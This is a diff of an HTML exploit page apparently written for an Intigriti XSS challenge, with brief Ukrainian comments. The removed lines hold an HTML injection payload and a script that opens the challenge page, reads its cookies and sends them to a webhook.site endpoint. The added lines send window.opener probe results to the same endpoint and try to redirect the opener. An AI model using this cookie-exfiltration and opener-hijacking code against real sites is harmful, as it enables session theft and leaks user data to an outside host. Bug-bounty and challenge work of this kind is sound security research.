@@ -2,26 +2,38 @@
 <html>
 <body>
 <script>
+const hook = 'https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c';
 const id = Math.random().toString(36).slice(2);
 
-const payload = `<form><h1></form><img name="authConfig" data-next="https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c" data-append="true"><table><form></form></table></form></table></h1></form><math><mi><style><!--</style><style title="--></style><img src=x>"></style></mi></math>`;
+function ping(q) {
+  fetch(hook + q + '&id=' + id, { mode: 'no-cors' });
+}
 
-const vulnUrl = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
+ping('?step=loaded');
 
-// відкриваємо challenge
-const w = window.open(vulnUrl, '_blank');
+ping('&step=opener_exists=' + (!!window.opener));
 
-// 🔥 головний трюк
-setTimeout(() => {
-  try {
-    // читаємо cookie через opener chain
-    const data = w.document.cookie;
-
-    fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?cookie=' + encodeURIComponent(data), {mode:'no-cors'});
-  } catch (e) {
-    fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?error=' + e, {mode:'no-cors'});
+try {
+  if (window.opener) {
+    ping('&step=opener_closed=' + window.opener.closed);
   }
-}, 2000);
+} catch (e) {
+  ping('&step=opener_closed_err=' + encodeURIComponent(String(e)));
+}
+
+try {
+  if (window.opener) {
+    window.opener.location = 'https://challenge-0326.intigriti.io/challenge.html?from=opener_probe';
+    ping('&step=opener_nav_attempted=true');
+  }
+} catch (e) {
+  ping('&step=opener_nav_err=' + encodeURIComponent(String(e)));
+}
+
+setTimeout(() => {
+  ping('&step=done');
+}, 1500);
 </script>
+OK
 </body>
 </html>
